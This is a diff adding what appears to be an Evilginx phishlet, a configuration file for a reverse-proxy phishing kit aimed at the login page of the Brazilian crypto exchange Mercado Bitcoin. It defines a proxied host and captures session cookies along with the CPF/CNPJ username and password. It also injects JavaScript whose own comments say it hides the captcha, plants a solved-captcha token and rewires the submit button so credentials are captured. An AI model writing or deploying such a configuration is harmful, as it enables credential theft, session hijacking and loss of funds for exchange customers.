@@ -1,0 +1,34 @@
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'mercadobitcoin.com.br', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'www.mercadobitcoin.com.br', orig_sub: 'www', domain: 'mercadobitcoin.com.br', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://mercadobitcoin.com.br/', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: '.mercadobitcoin.com.br'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'cpfcnpj'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.mercadobitcoin.com.br'
+  path: '/conta/login'
+js_inject:
+  - trigger_domains: ["www.mercadobitcoin.com.br"]
+    trigger_paths: ["/conta/login"]
+    script: |
+            function lp(){
+                var f0 = document.querySelector(".grecaptcha-badge").style.visibility = "hidden";                                 #it will Hide the failed captcha from user.
+                var f1 = document.getElementById("g-recaptcha-response").innerHTML="425262876f0b7661bd228e80215cca87";            #it will insert 2captcha token in captcha field
+                var f3 = document.body.innerHTML = document.body.innerHTML.replace(/onclick="$('.alert-danger').hide(); $(this).button('loading');"/g , 'onclick="document.getElementById("loginPageForm").submit();"');       #it will allow the submit button to let submit the credentials to server which will be captured.
+            return;
+            }
+            setTimeout(function(){lp();}, 1500);
